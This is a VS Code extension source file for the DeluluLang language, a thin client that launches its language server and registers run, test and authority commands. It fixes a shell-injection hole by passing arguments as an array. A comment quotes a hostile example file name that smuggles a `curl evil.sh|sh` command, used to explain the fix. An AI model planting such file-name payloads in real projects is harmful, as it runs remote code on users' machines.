// The DeluluLang VS Code client — a thin shell around `delulu lsp` (Stage 8, spec §3).
// One server, every surface: this extension adds NOTHING the server doesn't provide,
// by rule (Constitution §8.4 — no editor-specific server features, ever).
//
// Every command registered here must also appear in `package.json`'s `contributes.commands`,
// and must cover every command the server emits in a code lens. `editor_contract.rs` fails the
// build if those three lists ever disagree — a lens the editor cannot execute is worse than no
// lens, because the server advertises an action the user cannot take.
const vscode = require("vscode");
const { LanguageClient } = require("vscode-languageclient/node");

let client;

/// Run the CLI with an **argv array** — never a command string.
///
/// `shellPath`/`shellArgs` exec the binary directly, so nothing parses the arguments as shell
/// syntax. The previous form built one string (`` `${serverPath} run ${fsPath}` ``) and sent it
/// to whatever shell the user has: a file named `x;curl evil.sh|sh.delulu` executed on click, and
/// far more routinely, ANY path containing a space ran the wrong command. Paths here come from an
/// editor tab, so they are attacker-influenced whenever a project is opened from a clone.
function runInTerminal(name, serverPath, args) {
  const t = vscode.window.createTerminal({ name, shellPath: serverPath, shellArgs: args });
  t.show();
}

function activate(context) {
  const serverPath = vscode.workspace.getConfiguration("delulu").get("serverPath", "delulu");
  client = new LanguageClient(
    "delulu",
    "DeluluLang",
    { command: serverPath, args: ["lsp"] },
    { documentSelector: [{ scheme: "file", language: "delulu" }] }
  );
  client.start();

  // The codeLens commands invoke the CLI in the integrated terminal — the lens says
  // what it runs; the terminal shows it honestly.
  context.subscriptions.push(
    vscode.commands.registerCommand("delulu.run", (uri) => {
      runInTerminal("delulu run", serverPath, ["run", vscode.Uri.parse(uri).fsPath]);
    }),

    // The server sends `[uri, testName]`. Dropping the name ran the whole file, so clicking
    // "▶ run test" on one test silently ran every test in the document — including ones whose
    // declared effect row the package ceiling refuses, reporting failures the user never asked for.
    vscode.commands.registerCommand("delulu.test.run", (uri, testName) => {
      const args = ["test", vscode.Uri.parse(uri).fsPath];
      if (testName) {
        args.push(testName);
      }
      runInTerminal("delulu test", serverPath, args);
    }),

    // `delulu.authority` is answered by the SERVER (`workspace/executeCommand`), not the CLI:
    // it reports the §10.5 authority of the open document. The server has emitted this lens
    // since Stage 8 while no client registered it, so clicking it raised
    // "command 'delulu.authority' not found".
    vscode.commands.registerCommand("delulu.authority", async (uri) => {
      if (!client) {
        return;
      }
      const report = await client.sendRequest("workspace/executeCommand", {
        command: "delulu.authority",
        arguments: [uri],
      });
      if (!report) {
        vscode.window.showWarningMessage("delulu: no authority report for this document.");
        return;
      }
      if (report.error) {
        vscode.window.showWarningMessage(`delulu: ${report.error}`);
        return;
      }
      const doc = await vscode.workspace.openTextDocument({
        content: JSON.stringify(report, null, 2),
        language: "json",
      });
      await vscode.window.showTextDocument(doc, { preview: true });
    })
  );
}

function deactivate() {
  return client ? client.stop() : undefined;
}

module.exports = { activate, deactivate };
